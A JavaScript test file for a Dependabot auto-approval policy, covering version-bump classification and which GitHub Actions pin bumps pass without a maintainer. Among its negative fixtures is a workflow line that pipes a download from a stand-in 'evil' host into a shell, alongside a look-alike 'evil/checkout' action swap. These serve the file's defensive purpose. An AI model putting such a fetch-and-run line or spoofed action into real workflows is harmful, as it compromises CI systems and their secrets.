import test from "node:test";
import assert from "node:assert/strict";
import { bumpKind, dependabotDecision } from "../src/dependabot.mjs";
import { resolvePolicy } from "../src/classify.mjs";

const policy = resolvePolicy(null);
const files = [{ filename: "services/x/Dockerfile" }];

test("bump kinds", () => {
  assert.equal(bumpKind("3.26.4", "3.26.5"), "minor-or-patch");
  assert.equal(bumpKind("8.5.0", "8.5.1"), "minor-or-patch");
  assert.equal(bumpKind("10.13.0", "10.14.0"), "minor-or-patch");
  assert.equal(bumpKind("6.0.238", "7.0.153"), "major");
  assert.equal(bumpKind("24.20.0-bookworm-slim", "26.13.0-bookworm-slim"), "major");
  assert.equal(bumpKind("0.18.0", "0.19.0"), "major");
  assert.equal(bumpKind("0.18.0", "0.18.1"), "minor-or-patch");
  assert.equal(bumpKind("17.11-bookworm", "18.4-bookworm"), "major");
  assert.equal(bumpKind("d65108d", "47b510d"), "unknown");
  assert.equal(bumpKind("1.4.1", "1.4.1.post1"), "minor-or-patch");
  assert.equal(bumpKind("1.4.1.post1", "1.4.2.dev3"), "minor-or-patch");
  assert.equal(bumpKind("1.4.1.post1", "2.0.0"), "major");
});

test("real Dependabot titles from your repositories", () => {
  const d = (title, body = "") => dependabotDecision({ title, body, files }, policy);
  assert.equal(d("fix: bump @clerk/backend from 3.26.4 to 3.26.5 in the clerk-backend group").pass, true);
  assert.equal(d("chore(deps): bump ai from 6.0.238 to 7.0.153").pass, false);
  assert.equal(d("Bump node from 24.20.0-bookworm-slim to 26.13.0-bookworm-slim in /services/x").reason, "major version update");
  assert.equal(d("Bump playwright from `d65108d` to `47b510d` in /services/opt").pass, true, "digest-only bump");
  assert.equal(d("Bump python from `e697c81` to `935c3c5` in /services/x").pass, true, "digest-only bump (homelab #275)");
  assert.equal(d("Bump x from 1234567 to 1234568").pass, false, "a plain number is not a digest");
  assert.equal(d("Bump pytest-asyncio from 1.4.1 to 1.4.1.post1").pass, true, "PEP 440 post release (homelab #278)");
  assert.equal(d("Bump pytest from 1.4.1 to 2.0.0.post1").pass, false);
  assert.equal(d("Bump the container-images group across 5 directories with 5 updates").reason, "could not read the version change");
  const groupBody = "Bumps the aws-sdk group with 2 updates.\nUpdates `@aws-sdk/client-s3` from 3.1000.0 to 3.1001.0\nUpdates `@aws-sdk/lib` from 3.1000.0 to 3.1002.0";
  assert.equal(d("chore(deps): bump the aws-sdk group with 2 updates", groupBody).pass, true);
  const mixed = groupBody + "\nUpdates `left-pad` from 1.0.0 to 2.0.0";
  assert.equal(d("chore(deps): bump the aws-sdk group with 3 updates", mixed).pass, false);
});

test("Actions updates and labelled pull requests need a maintainer", () => {
  const actions = dependabotDecision({ title: "Bump ruby/setup-ruby from 1.335.0 to 1.336.0", files: [{ filename: ".github/workflows/ci.yml" }] }, policy);
  assert.equal(actions.pass, false);
  const labelled = dependabotDecision({ title: "Bump a from 1.0.0 to 1.0.1", labels: ["needs-review"], files }, policy);
  assert.equal(labelled.pass, false);
});

const sha = (c) => c.repeat(40);
const wf = (patch, filename = ".github/workflows/ci.yml") => ({ filename, status: "modified", patch });
const bump = (name, from, to, v1, v2, indent = "      - ") =>
  `@@ -10,3 +10,3 @@ jobs:\n steps:\n-${indent}uses: ${name}@${sha(from)} # ${v1}\n+${indent}uses: ${name}@${sha(to)} # ${v2}\n run: x`;
const branch = "dependabot/github_actions/shared-automation-abc";
const act = (files, title = "Bump the group", body = "") => dependabotDecision({ title, body, files, branch }, policy);

test("Actions pin bumps at patch or minor pass; everything else still needs a maintainer", () => {
  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2"))]).pass, true);
  assert.equal(act([wf(bump("NoahJenkins/.github/pr-repair", "a", "b", "v1.0.0", "v1.1.0"))]).pass, true);
  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v5.0.0"))]).reason, "major version update");
  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2")), { filename: "action.yml", status: "modified", patch: bump("actions/setup-node", "c", "d", "v4.4.0", "v4.5.0", "  ") }]).pass, true);
  // Not purely a pin bump: another line changed, a different action, a non-workflow file, or no branch.
  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2") + "\n+      run: curl evil | sh")]).pass, false);
  assert.equal(act([wf("@@ -1 +1 @@\n-      run: a\n+      run: b")]).pass, false);
  assert.equal(act([wf(`@@ -1 +1 @@\n-      - uses: actions/checkout@${sha("a")} # v4.3.1\n+      - uses: evil/checkout@${sha("b")} # v4.3.2`)]).pass, false);
  assert.equal(act([wf(`@@ -1 +1 @@\n-      - uses: actions/checkout@v4\n+      - uses: actions/checkout@v5`)]).pass, false, "tag refs are not SHA pins");
  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2")), { filename: "src/app.js", status: "modified", patch: "+x" }]).pass, false);
  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2"), ".github/CODEOWNERS")]).pass, false);
  assert.equal(act([{ filename: ".github/workflows/ci.yml", status: "modified" }]).pass, false, "no patch (too large to inspect)");
  assert.equal(dependabotDecision({ title: "Bump actions/checkout from 4.3.1 to 4.3.2", files: [wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2"))], branch: "feature/x" }, policy).pass, false, "only Dependabot's github_actions branches qualify");
  assert.equal(dependabotDecision({ title: "x", labels: ["needs-review"], files: [wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2"))], branch }, policy).pass, false);
  // Without a version comment the PR text decides.
  const bare = `@@ -1 +1 @@\n-      - uses: actions/checkout@${sha("a")}\n+      - uses: actions/checkout@${sha("b")}`;
  assert.equal(act([wf(bare)], "Bump actions/checkout from 4.3.1 to 4.3.2").pass, true);
  assert.equal(act([wf(bare)], "Bump actions/checkout from 4.3.1 to 5.0.0").pass, false);
  assert.equal(act([wf(bare)], "Bump the group").pass, false);
});
